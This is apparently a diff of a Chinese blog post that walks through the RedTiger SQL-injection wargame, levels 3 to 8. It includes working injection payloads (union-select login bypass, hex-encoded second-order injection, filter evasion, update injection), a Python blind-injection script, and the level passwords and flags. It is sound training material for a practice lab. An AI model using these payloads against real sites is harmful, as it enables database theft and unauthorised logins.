+加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMTQwMjI4MDYzMTk4MTM1MTA3MTA2MTgwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTU4MjIwMDcxMDQwMjIwMjA5MDMz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161210.png" /></p>
 <p>注意登录的时候，Username为admin，不要大写。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: a707b245a60d570d25a0449c2a516eca</span><br><span class="line"></span><br><span class="line">The password for the next level is: put_the_kitten_on_your_head</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: a707b245a60d570d25a0449c2a516eca
+
+The password for the next level is: put_the_kitten_on_your_head<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h1 id="level-4">Level-4</h1>
 <h2 id="题目描述-3">题目描述</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161335.png" /></p>
@@ -416,27 +333,56 @@
 </ul>
 <p>因此为数字型的注入点。</p>
 <h2 id="注入过程-3">注入过程</h2>
-<p>注意本题是盲注。并且如果判断错误将会出现提示<code>Query returned 0 rows.</code>，而判断正确则会出现<code>Query returned 1 rows.</code>或者<code>Query returned 2 rows.</code>。因此根据错误的提示不同可以先测试以下word的长度为多少。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and length((select keyword from level4_secret limit 0,1))=21</span><br></pre></td></tr></table></figure></p>
-<p>不断修改后面的值，发现长度为21，因此编写如下脚本： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time  </span><br><span class="line">  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">url = <span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php&#x27;</span>  </span><br><span class="line">header = &#123;  </span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">payload = <span class="string">&#x27;1 and ascii(substr((select keyword from level4_secret limit 0,1),%d,1))=%d&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">22</span>):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  </span><br><span class="line">        param = &#123;  </span><br><span class="line">            <span class="string">&quot;id&quot;</span>: payload % (i, j)  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.get(url, params=param, headers=header)  </span><br><span class="line">        time.sleep(<span class="number">0.2</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Query returned 0 rows&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line"> flag += <span class="built_in">chr</span>(j)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure> （本题需要注意，每次通过都会给一个<code>The password for the next level is:xxx</code> 这是用来登录的，会保存在cookie中，所以要在脚本中添加cookie，否则无法访问。可以抓包查看cookie）</p>
-<p>得到： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killstickswithbr1cks!</span><br></pre></td></tr></table></figure></p>
-<p>成功注入。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa</span><br><span class="line"></span><br><span class="line">The password for the next level is: this_hack_it&#x27;s_old</span><br></pre></td></tr></table></figure></p>
+<p>注意本题是盲注。并且如果判断错误将会出现提示<code>Query returned 0 rows.</code>，而判断正确则会出现<code>Query returned 1 rows.</code>或者<code>Query returned 2 rows.</code>。因此根据错误的提示不同可以先测试以下word的长度为多少。 <pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 and length((select keyword from level4_secret limit 0,1))&#x3D;21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>不断修改后面的值，发现长度为21，因此编写如下脚本： <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> time  
+  
+flag <span class="token operator">=</span> <span class="token string">''</span>  
+url <span class="token operator">=</span> <span class="token string">'http://redtiger.labs.overthewire.org/level4.php'</span>  
+header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  
+    <span class="token string">'cookie'</span><span class="token punctuation">:</span> <span class="token string">'level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head'</span>  
+<span class="token punctuation">&#125;</span>  
+payload <span class="token operator">=</span> <span class="token string">'1 and ascii(substr((select keyword from level4_secret limit 0,1),%d,1))=%d'</span>  
+  
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
+        param <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  
+            <span class="token string">"id"</span><span class="token punctuation">:</span> payload <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>  
+        <span class="token punctuation">&#125;</span>  
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>param<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>  
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>  
+        <span class="token keyword">if</span> <span class="token string">"Query returned 0 rows"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  
+            <span class="token keyword">continue</span>  
+ flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>  
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag:"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>  
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> （本题需要注意，每次通过都会给一个<code>The password for the next level is:xxx</code> 这是用来登录的，会保存在cookie中，所以要在脚本中添加cookie，否则无法访问。可以抓包查看cookie）</p>
+<p>得到： <pre class="line-numbers language-none"><code class="language-none">killstickswithbr1cks!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>成功注入。 <pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa
+
+The password for the next level is: this_hack_it&#39;s_old<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
 <h1 id="level-5">Level-5</h1>
 <h2 id="题目描述-4">题目描述</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318165905.png" /></p>
 <p>本题也是登录绕过，并且存在过滤，而且密码是经过md5加密的。</p>
 <h2 id="测试注入点-4">测试注入点</h2>
-<p>分别使用： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. username=1&#x27;&amp;password=1&amp;login=Login</span><br><span class="line">2. username=1&#x27;#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure></p>
-<p>发现前者出现： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_num_rows() expects parameter 1 to be resource, boolean given in &lt;b&gt;/var/www/html/hackit/level5.php</span><br></pre></td></tr></table></figure></p>
+<p>分别使用： <pre class="line-numbers language-none"><code class="language-none">1. username&#x3D;1&#39;&amp;password&#x3D;1&amp;login&#x3D;Login
+2. username&#x3D;1&#39;#&amp;password&#x3D;1&amp;login&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>发现前者出现： <pre class="line-numbers language-none"><code class="language-none">mysql_num_rows() expects parameter 1 to be resource, boolean given in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;hackit&#x2F;level5.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>而后者没有，说明 username为注入点，并且闭合方式为单引号。</p>
 <h2 id="注入过程-4">注入过程</h2>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试字段数：username=1&#x27; order by 2#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">测试字段数：username&#x3D;1&#39; order by 2#&amp;password&#x3D;1&amp;login&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>本题是登录绕过，所以优先尝试 <code>1' or 1=1#</code> 发现无法登录。又因为字段数为2，因此做一个猜测（这很重要，很多情况都需要猜测）：</p>
 <blockquote>
 <p>这两个字段一个是username，另一个是password。根据输入的username，去数据库查询是否存在该用户，如果存在该用户则返回username和password，然后将返回的password和输入的password进行对比，如果一样则登录成功，否则登陆失败。</p>
 </blockquote>
-<p>根据这猜测，那么我们随便查询一个不存在的用户，这样子就没有返回的结果。然后联合查询，密码字段为<code>md5(number)</code>，这样子就会返回一个结果，其中密码字段为 <code>md5(number)</code> 。如果输入的password为 <code>number</code> ，则md5加密后会与返回结果中的密码一致，从而登陆成功。所以构造如下payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27; union select 1,md5(1)#&amp;password=1&amp;login=Login</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">username: 1&#x27; union select 1,md5(1)#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure></p>
+<p>根据这猜测，那么我们随便查询一个不存在的用户，这样子就没有返回的结果。然后联合查询，密码字段为<code>md5(number)</code>，这样子就会返回一个结果，其中密码字段为 <code>md5(number)</code> 。如果输入的password为 <code>number</code> ，则md5加密后会与返回结果中的密码一致，从而登陆成功。所以构造如下payload： <pre class="line-numbers language-none"><code class="language-none">username&#x3D;1&#39; union select 1,md5(1)#&amp;password&#x3D;1&amp;login&#x3D;Login
+
+或者：
+username: 1&#39; union select 1,md5(1)#
+password: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>需要注意两点： 1. 上面所述的 number 要一样； 2. 要得到password所在的位置，要么第一个，要么第二个，尝试两次就出来了；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: the_stone_is_cold</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3  
+  
+The password for the next level is: the_stone_is_cold<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h1 id="level-6">Level-6 ⭐</h1>
 <h2 id="题目描述-5">题目描述</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318171918.png" /></p>
@@ -446,11 +392,11 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172316.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172325.png" /></p>
 <h2 id="注入过程-5">注入过程</h2>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试字段数：?user=1 order by 5</span><br></pre></td></tr></table></figure>
-<p>字段数为5。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试显示位：?user=-1 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></p>
-<p>得到一个很奇怪的结果：<code>User not found</code>，也就是没有显示位，只是返回了user=-1的查询结果。如下payload的结果也是一样： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=-1 union select 1,2,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
+<pre class="line-numbers language-none"><code class="language-none">测试字段数：?user&#x3D;1 order by 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>字段数为5。 <pre class="line-numbers language-none"><code class="language-none">测试显示位：?user&#x3D;-1 union select 1,2,3,4,5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>得到一个很奇怪的结果：<code>User not found</code>，也就是没有显示位，只是返回了user=-1的查询结果。如下payload的结果也是一样： <pre class="line-numbers language-none"><code class="language-none">?user&#x3D;-1 union select 1,2,3,4,5 from level6_users where status&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>接下来就是随便的一些尝试，分别将 <code>admin</code>, <code>deddlef</code>, <code>username</code>,<code>password</code> 四个关键词分别带入五个位置，基本都是提示： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318191919.png" /></p>
-<p>只有下面的payload有所不同： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=-1 union select 1,username,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
+<p>只有下面的payload有所不同： <pre class="line-numbers language-none"><code class="language-none">?user&#x3D;-1 union select 1,username,3,4,5 from level6_users where status&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318192043.png" /></p>
 <h3 id="思路">思路 ⭐</h3>
 <p>出现了新的显示。看了大佬的writeup，得到如下思路：</p>
@@ -499,59 +445,90 @@
 <p>此时字段2即为注入点，如果直接输入 admin，则会返回admin的信息。</p>
 <h3 id="过程">过程</h3>
 <p>所以对第二个字段进行注入，根据得到的结果，第二个字段应该是username，然后利用username进行第二次查询数据库，得到信息。</p>
-<p>这里有一个细节看：[[SQL注入总结#利用]] <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?user=-1%20union%20select%201,admin&#x27;,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e27,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line"></span><br><span class="line">?user=-1%20union%20select%201,admin&#x27;#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e2723,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure></p>
+<p>这里有一个细节看：[[SQL注入总结#利用]] <pre class="line-numbers language-none"><code class="language-none">?user&#x3D;-1%20union%20select%201,admin&#39;,3,4,5%20from%20level6_users%20where%20status&#x3D;1
+16进制转换后：?user&#x3D;-1%20union%20select%201,0x61646d696e27,3,4,5%20from%20level6_users%20where%20status&#x3D;1
+
+?user&#x3D;-1%20union%20select%201,admin&#39;#,3,4,5%20from%20level6_users%20where%20status&#x3D;1
+16进制转换后：?user&#x3D;-1%20union%20select%201,0x61646d696e2723,3,4,5%20from%20level6_users%20where%20status&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>发现前者出现报错，而后者没有报错。说明确实在第二个字段处存在注入，接下来就是常规的注入过程。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 测试字段数：</span><br><span class="line">?user=-1%20union%20select%201,admin&#x27; order by 5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x61646d696e27206f72646572206279203523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1. 测试字段数：
+?user&#x3D;-1%20union%20select%201,admin&#39; order by 5#,3,4,5%20from%20level6_users%20where%20status&#x3D;1
+16进制转换后:?user&#x3D;-1%20union%20select%201,0x61646d696e27206f72646572206279203523,3,4,5%20from%20level6_users%20where%20status&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>发现显示字段还是5个</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2. 测试显示位：</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,2,3,4,5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">2. 测试显示位：
+?user&#x3D;-1%20union%20select%201,&#39; union select 1,2,3,4,5#,3,4,5%20from%20level6_users%20where%20status&#x3D;1
+16进制转换后:?user&#x3D;-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%20from%20level6_users%20where%20status&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>结果如下： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194025.png" /></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3. 显示用户名和密码</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,username,3,password,5 from level6_users where status=1#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">3. 显示用户名和密码
+?user&#x3D;-1%20union%20select%201,&#39; union select 1,username,3,password,5 from level6_users where status&#x3D;1#,3,4,5%20from%20level6_users%20where%20status&#x3D;1
+16进制转换后:?user&#x3D;-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%20from%20level6_users%20where%20status&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>成功得到用户名和密码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194406.png" /></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932</span><br><span class="line"></span><br><span class="line">The password for the next level is: shitcoins_are_hold</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932
+
+The password for the next level is: shitcoins_are_hold<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h1 id="level-7">Level-7</h1>
 <h2 id="题目描述-6">题目描述</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195333.png" /></p>
 <p>题目要求：查询关于google的信息的作者，输入google发现得到一篇文章，但是没有作者。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195818.png" /></p>
 <h2 id="测试注入点-6">测试注入点</h2>
-<p>输入 <code>google'</code> 发现报错信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)&#x27; at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%google&#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)</span><br><span class="line"></span><br><span class="line">因此，完整的查询语句如下：SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%输入%&#x27; OR text.title LIKE &#x27;%输入%&#x27;)</span><br></pre></td></tr></table></figure></p>
+<p>输入 <code>google'</code> 发现报错信息： <pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;%&#39; OR text.title LIKE &#39;%google&#39;%&#39;)&#39; at line 1
+
+SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id &#x3D; news.id AND (text.text LIKE &#39;%google&#39;%&#39; OR text.title LIKE &#39;%google&#39;%&#39;)
+
+因此，完整的查询语句如下：SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id &#x3D; news.id AND (text.text LIKE &#39;%输入%&#39; OR text.title LIKE &#39;%输入%&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>但是 <code>#</code> 、<code>空格</code> 、<code>--+</code> 都被过滤了。但是可以用 <code>%09</code> 和 <code>%a0</code> 代替，不过注意一定要在burpsuite中，不要直接在输入框中输入，否则%号会被再次url编码。其中 <code>%09</code> 为制表符，后者不太懂。</p>
-<p>因此： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search=google%&#x27;)--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
+<p>因此： <pre class="line-numbers language-none"><code class="language-none">search&#x3D;google%&#39;)--%a0&amp;dosearch&#x3D;search%21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203348.png" /></p>
 <h2 id="注入过程-6">注入过程</h2>
-<p>获取显示位： 发现 order by被过滤，不论是大小写、注释都不行。那么直接使用联合查询，如果位数不对也会报错 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,4--%a0&amp;dosearch=search%21 -&gt; 四个字段</span><br></pre></td></tr></table></figure></p>
+<p>获取显示位： 发现 order by被过滤，不论是大小写、注释都不行。那么直接使用联合查询，如果位数不对也会报错 <pre class="line-numbers language-none"><code class="language-none">search&#x3D;-1%&#39;)union select 1,2,3,4--%a0&amp;dosearch&#x3D;search%21 -&gt; 四个字段<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203641.png" /></p>
-<p>获取作者名字： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,autor from level7_news--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
+<p>获取作者名字： <pre class="line-numbers language-none"><code class="language-none">search&#x3D;-1%&#39;)union select 1,2,3,autor from level7_news--%a0&amp;dosearch&#x3D;search%21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203840.png" /></p>
 <p>猜测应该是 <code>TestUserforg00gle</code>，成功。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80</span><br><span class="line"></span><br><span class="line">The password for the next level is: or_so_i&#x27;m_told</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80
+
+The password for the next level is: or_so_i&#39;m_told<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h1 id="level-8">Level-8</h1>
 <h2 id="题目描述-7">题目描述 ⭐</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318204016.png" /></p>
 <p>这道题给出的是关于 admin 的信息，还有编辑的按钮。猜测本题应该是关于数据更新的注入，即 <code>update</code> ，前面都是 <code>select</code> 的。</p>
-<p><code>update</code> 的语句如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=value2,... where column_name3=value;</span><br><span class="line"></span><br><span class="line">前面的column_name是要修改的字段，如果是字符串，则value需要加引号。后面的column_name3是用来找到需要修改的信息。</span><br></pre></td></tr></table></figure></p>
-<p>需要注意的是： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=column_name4,... where column_name3=value;</span><br></pre></td></tr></table></figure></p>
+<p><code>update</code> 的语句如下： <pre class="line-numbers language-none"><code class="language-none">update table_name set column_name1&#x3D;value1,column_name2&#x3D;value2,... where column_name3&#x3D;value;
+
+前面的column_name是要修改的字段，如果是字符串，则value需要加引号。后面的column_name3是用来找到需要修改的信息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>需要注意的是： <pre class="line-numbers language-none"><code class="language-none">update table_name set column_name1&#x3D;value1,column_name2&#x3D;column_name4,... where column_name3&#x3D;value;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318210614.png" /></p>
 <p>上述语句会将字段4的值赋给字段2，本题应该考察的就是这个。</p>
 <h2 id="测试注入点-7">测试注入点</h2>
-<p>依次对所有的输入添加单引号，发现只有 Email 报错： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;1&#x27;, age = &#x27;1&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
-<p>如果payload如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=1&#x27;&amp;name=abc&amp;icq=12345&amp;age=90&amp;edit=Edit</span><br></pre></td></tr></table></figure></p>
